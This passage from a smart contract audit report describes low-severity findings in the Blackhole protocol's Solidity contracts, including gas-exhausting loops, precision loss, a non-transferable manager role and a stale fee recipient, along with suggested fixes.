<h3 style="position:relative;" id="recommended-mitigation-steps-25"><a class="anchor before" aria-label="recommended mitigation steps 25 permalink" href="#recommended-mitigation-steps-25"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>Recommended mitigation steps</h3>
<p>Implement the purchased function with appropriate logic; however, the protocol intends to use this function.</p>
<h2 style="position:relative;" id="03-stack-too-deep-error-in-inline-assembly-variable-headstart"><a class="anchor before" aria-label="03 stack too deep error in inline assembly variable headstart permalink" href="#03-stack-too-deep-error-in-inline-assembly-variable-headstart"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>[03] Stack too deep error in inline assembly (variable <code>headStart</code>)</h2>
<p>The Solidity compiler enforces a limit of 16 stack slots for local variables and parameters within a function due to EVM constraints. When a function contains too many variables, especially combined with inline assembly code that requires stack slots, the compiler throws a “stack too deep” error. In this case, the variable <code>headStart</code> could not be allocated a slot inside the stack because it was already too deep.</p>
<h3 style="position:relative;" id="impact-14"><a class="anchor before" aria-label="impact 14 permalink" href="#impact-14"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>Impact</h3>
<ul>
<li>Compilation Failure: The contract code cannot compile successfully, halting deployment and testing.</li>
<li>Functionality Blocked: Critical functions that use this variable inside inline assembly cannot be deployed or used until the issue is resolved.</li>
</ul>
<h3 style="position:relative;" id="recommended-mitigation-steps-26"><a class="anchor before" aria-label="recommended mitigation steps 26 permalink" href="#recommended-mitigation-steps-26"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>Recommended mitigation steps</h3>
<p>Minimize Inline Assembly: Simplify or minimize the inline assembly code to use fewer variables or perform logic in Solidity instead.</p>
<h2 style="position:relative;" id="04-hardcoded-manager-lacks-ability-to-renounce-control"><a class="anchor before" aria-label="04 hardcoded manager lacks ability to renounce control permalink" href="#04-hardcoded-manager-lacks-ability-to-renounce-control"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>[04] Hardcoded manager lacks ability to renounce control</h2>
<p><a href="https://github.com/code-423n4/2025-05-blackhole/blob/92fff849d3b266e609e6d63478c4164d9f608e91/contracts/GenesisPool.sol#L44">https://github.com/code-423n4/2025-05-blackhole/blob/92fff849d3b266e609e6d63478c4164d9f608e91/contracts/GenesisPool.sol#L44</a></p>
<h3 style="position:relative;" id="finding-description-15"><a class="anchor before" aria-label="finding description 15 permalink" href="#finding-description-15"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>Finding description</h3>
<p>The contract defines an <code>onlyManager</code> modifier that restricts access to certain functions exclusively to a hardcoded <code>genesisManager</code> address. However, there is no mechanism to transfer or renounce this privileged role, making it permanently tied to the initial deployer or assigned address.</p>
<h3 style="position:relative;" id="impact-15"><a class="anchor before" aria-label="impact 15 permalink" href="#impact-15"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>Impact</h3>
<ul>
<li>The absence of <code>transferManager</code> or <code>renounceManager</code> functions introduces centralization and governance risks. If the manager’s private key is lost, compromised, or becomes inactive, all functions guarded by <code>onlyManager</code> will become permanently unusable. </li>
<li>No flexibility.</li>
</ul>
<h3 style="position:relative;" id="recommended-mitigation-steps-27"><a class="anchor before" aria-label="recommended mitigation steps 27 permalink" href="#recommended-mitigation-steps-27"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>Recommended mitigation steps</h3>
<p>Allow the current manager to securely assign a new address:</p>
<pre data-index="81" data-language="solidity" class="grvsc-container dark-default-dark"><code class="grvsc-code"><span class="grvsc-line"><span class="grvsc-source"><span class="mtk4">function</span><span class="mtk1"> </span><span class="mtk11">transferManager</span><span class="mtk1">(</span><span class="mtk12">address</span><span class="mtk1"> </span><span class="mtk12">newManager</span><span class="mtk1">) </span><span class="mtk11">external</span><span class="mtk1"> </span><span class="mtk11">onlyManager</span><span class="mtk1"> {</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk11">require</span><span class="mtk1">(</span><span class="mtk12">newManager</span><span class="mtk1"> != </span><span class="mtk11">address</span><span class="mtk1">(</span><span class="mtk7">0</span><span class="mtk1">), </span><span class="mtk8">"ZERO_ADDR"</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk12">genesisManager</span><span class="mtk1"> = </span><span class="mtk12">newManager</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">}</span></span></span></code></pre>
<h2 style="position:relative;" id="05-precision-loss-in-smnft-bonus-calculation-may-result-in-zero-bonus-when-updating-to-smnft"><a class="anchor before" aria-label="05 precision loss in smnft bonus calculation may result in zero bonus when updating to smnft permalink" href="#05-precision-loss-in-smnft-bonus-calculation-may-result-in-zero-bonus-when-updating-to-smnft"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>[05] Precision loss in smNFT bonus calculation may result in zero bonus when updating to smNFT</h2>
<p><a href="https://github.com/code-423n4/2025-05-blackhole/blob/92fff849d3b266e609e6d63478c4164d9f608e91/contracts/VotingEscrow.sol#L1364">https://github.com/code-423n4/2025-05-blackhole/blob/92fff849d3b266e609e6d63478c4164d9f608e91/contracts/VotingEscrow.sol#L1364</a></p>
<h3 style="position:relative;" id="finding-description-16"><a class="anchor before" aria-label="finding description 16 permalink" href="#finding-description-16"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>Finding description</h3>
<p>The <code>calculate_sm_nft_bonus</code> function calculates a bonus amount for smNFT (Super Massive NFT) users based on a fixed bonus rate (<code>SMNFT_BONUS</code>) and a precision constant (<code>PRECISISON</code>). The formula used is:</p>
<pre data-index="82" data-language="solidity" class="grvsc-container dark-default-dark"><code class="grvsc-code"><span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">  </span><span class="mtk4">function</span><span class="mtk1"> </span><span class="mtk11">calculate_sm_nft_bonus</span><span class="mtk1">(</span><span class="mtk12">uint</span><span class="mtk1"> </span><span class="mtk12">amount</span><span class="mtk1">) </span><span class="mtk11">public</span><span class="mtk1"> </span><span class="mtk11">view</span><span class="mtk1"> </span><span class="mtk11">returns</span><span class="mtk1"> (</span><span class="mtk12">uint</span><span class="mtk1">){ </span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk15">return</span><span class="mtk1"> (</span><span class="mtk12">SMNFT_BONUS</span><span class="mtk1"> * </span><span class="mtk12">amount</span><span class="mtk1">) / </span><span class="mtk12">PRECISION</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    }</span></span></span></code></pre>
<p><code>SMNFT_BONUS</code> = 1000 and <code>PRECISISON</code> = 10000</p>
<p>The function gives a 10% bonus. However, when updating to a smNFT and the current locked amount in the lock is low, it can lead to the user receiving zero bonus.</p>
<h3 style="position:relative;" id="impact-16"><a class="anchor before" aria-label="impact 16 permalink" href="#impact-16"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>Impact</h3>
<p>While the logic is correct, integer division in Solidity can lead to precision loss for small amounts. In particular:</p>
<p>For amount = 9, the bonus becomes <code>(1000 * 9) / 10000 = 9000 / 10000 = 0</code>.</p>
<p>Users having small amounts in their lock may receive no bonus at all.</p>
<h3 style="position:relative;" id="recommended-mitigation-steps-28"><a class="anchor before" aria-label="recommended mitigation steps 28 permalink" href="#recommended-mitigation-steps-28"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>Recommended mitigation steps</h3>
<p>Enforce a minimum bonus floor.</p>
<h2 style="position:relative;" id="06-getvotes-wiew-function-becomes-unusable-when-a-user-owns-too-many-locks"><a class="anchor before" aria-label="06 getvotes wiew function becomes unusable when a user owns too many locks permalink" href="#06-getvotes-wiew-function-becomes-unusable-when-a-user-owns-too-many-locks"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>[06] <code>getVotes()</code> wiew function becomes unusable when a user owns too many locks</h2>
<p><a href="https://github.com/code-423n4/2025-05-blackhole/blob/92fff849d3b266e609e6d63478c4164d9f608e91/contracts/VotingEscrow.sol#L1231">https://github.com/code-423n4/2025-05-blackhole/blob/92fff849d3b266e609e6d63478c4164d9f608e91/contracts/VotingEscrow.sol#L1231</a></p>
<h3 style="position:relative;" id="finding-description-17"><a class="anchor before" aria-label="finding description 17 permalink" href="#finding-description-17"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>Finding description</h3>
<p>The <code>getVotes()</code> function in the VotingEscrow contract is responsible for computing a user’s voting power by summing the voting weights of all lock NFTs (token IDs) they held at the latest checkpoint:</p>
<pre data-index="83" data-language="solidity" class="grvsc-container dark-default-dark"><code class="grvsc-code"><span class="grvsc-line"><span class="grvsc-source"><span class="mtk12">uint</span><span class="mtk1">[] </span><span class="mtk12">storage</span><span class="mtk1"> </span><span class="mtk12">_tokenIds</span><span class="mtk1"> = </span><span class="mtk12">cpData</span><span class="mtk1">.</span><span class="mtk12">checkpoints</span><span class="mtk1">[</span><span class="mtk12">account</span><span class="mtk1">][</span><span class="mtk12">nCheckpoints</span><span class="mtk1"> - </span><span class="mtk7">1</span><span class="mtk1">].</span><span class="mtk12">tokenIds</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk15">for</span><span class="mtk1"> (</span><span class="mtk12">uint</span><span class="mtk1"> </span><span class="mtk12">i</span><span class="mtk1"> = </span><span class="mtk7">0</span><span class="mtk1">; </span><span class="mtk12">i</span><span class="mtk1"> &lt; </span><span class="mtk12">_tokenIds</span><span class="mtk1">.</span><span class="mtk12">length</span><span class="mtk1">; </span><span class="mtk12">i</span><span class="mtk1">++) {</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk12">uint</span><span class="mtk1"> </span><span class="mtk12">tId</span><span class="mtk1"> = </span><span class="mtk12">_tokenIds</span><span class="mtk1">[</span><span class="mtk12">i</span><span class="mtk1">];</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk12">votes</span><span class="mtk1"> = </span><span class="mtk12">votes</span><span class="mtk1"> + </span><span class="mtk12">VotingBalanceLogic</span><span class="mtk1">.</span><span class="mtk11">balanceOfNFT</span><span class="mtk1">(</span><span class="mtk12">tId</span><span class="mtk1">, </span><span class="mtk12">block</span><span class="mtk1">.</span><span class="mtk12">timestamp</span><span class="mtk1">, </span><span class="mtk12">votingBalanceLogicData</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">}</span></span></span></code></pre>
<p>This implementation assumes the number of token IDs per user remains reasonably small. However, in practice, a user can accumulate a large number of locks through creation of locks, splits, or transfers — potentially owning hundreds of NFT’s.</p>
<p>Because <code>getVotes()</code> is a view function that loops over all token IDs and performs expensive computations for each, this view function can lead to gas exhaustion and revert.</p>
<h3 style="position:relative;" id="impact-17"><a class="anchor before" aria-label="impact 17 permalink" href="#impact-17"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>Impact</h3>
<p>Unusable view function, due to gas exhaustion.</p>
<h3 style="position:relative;" id="recommended-mitigation-steps-29"><a class="anchor before" aria-label="recommended mitigation steps 29 permalink" href="#recommended-mitigation-steps-29"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>Recommended mitigation steps</h3>
<p>The protocol should only allow users to own a specific amount of locks.</p>
<h2 style="position:relative;" id="07-distributeall-function-at-risk-of-repeated-failure-due-to-unbounded-loop-over-gauges"><a class="anchor before" aria-label="07 distributeall function at risk of repeated failure due to unbounded loop over gauges permalink" href="#07-distributeall-function-at-risk-of-repeated-failure-due-to-unbounded-loop-over-gauges"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>[07] <code>distributeAll()</code> function at risk of repeated failure due to unbounded loop over gauges</h2>
<p><a href="https://github.com/code-423n4/2025-05-blackhole/blob/92fff849d3b266e609e6d63478c4164d9f608e91/contracts/GaugeManager.sol#L341">https://github.com/code-423n4/2025-05-blackhole/blob/92fff849d3b266e609e6d63478c4164d9f608e91/contracts/GaugeManager.sol#L341</a></p>
<h3 style="position:relative;" id="finding-description-18"><a class="anchor before" aria-label="finding description 18 permalink" href="#finding-description-18"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>Finding description</h3>
<p>The <code>distributeAll()</code> function aims to distribute emissions to all gauges by iterating over the entire list of pools and calling an internal <code>_distribute</code> function on each corresponding gauge. While this approach appears straightforward, it employs an unbounded for loop based on the dynamic length of the pools array. As the number of pools grows, the gas cost of executing this function increases proportionally, potentially leading to out-of-gas errors and causing the function to fail.</p>
<p>In large-scale deployments, it’s common for protocols to have hundreds of gauges, each associated with multiple pools. For example, with just 500 gauges each having 5 pools, the loop would have to iterate over 2,500 pools. This poses a serious risk as the gas cost per iteration adds up quickly.</p>
<h3 style="position:relative;" id="impact-18"><a class="anchor before" aria-label="impact 18 permalink" href="#impact-18"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>Impact</h3>
<p>Denial of Service (DoS): As the number of pools increases, the <code>distributeAll()</code> function is likely to exceed the block gas limit, causing it to revert. This prevents emissions from being distributed entirely.</p>
<h3 style="position:relative;" id="recommended-mitigation-steps-30"><a class="anchor before" aria-label="recommended mitigation steps 30 permalink" href="#recommended-mitigation-steps-30"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>Recommended mitigation steps</h3>
<p>Implement a <code>canDistributeAll()</code> view function that simulates the loop’s expected gas cost and compares it against a conservative gas limit threshold. This allows off-chain tools and frontend interfaces to pre-check if calling <code>distributeAll()</code> would likely succeed without incurring gas costs.</p>
<h2 style="position:relative;" id="08-fee-recipient-may-remain-set-to-previous-owner"><a class="anchor before" aria-label="08 fee recipient may remain set to previous owner permalink" href="#08-fee-recipient-may-remain-set-to-previous-owner"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>[08] Fee recipient may remain set to previous owner</h2>
<p><a href="https://github.com/code-423n4/2025-05-blackhole/blob/92fff849d3b266e609e6d63478c4164d9f608e91/contracts/CustomPoolDeployer.sol#L179">https://github.com/code-423n4/2025-05-blackhole/blob/92fff849d3b266e609e6d63478c4164d9f608e91/contracts/CustomPoolDeployer.sol#L179</a></p>
<h3 style="position:relative;" id="finding-description-19"><a class="anchor before" aria-label="finding description 19 permalink" href="#finding-description-19"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>Finding description</h3>
<p>The <code>setAlgebraFeeRecipient()</code> function allows the current owner to set a address to receive protocol fees. However, there is no automatic reset or update of the <code>algebraFeeRecipient</code> when ownership is transferred. This creates a risk where the previous owner continues to receive protocol fees even after relinquishing ownership unintentionally.</p>
<h3 style="position:relative;" id="impact-19"><a class="anchor before" aria-label="impact 19 permalink" href="#impact-19"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>Impact</h3>
<p>Revenue leakage: Fees meant for the protocol or new owner could be misdirected to the previous owner unintentionally.</p>
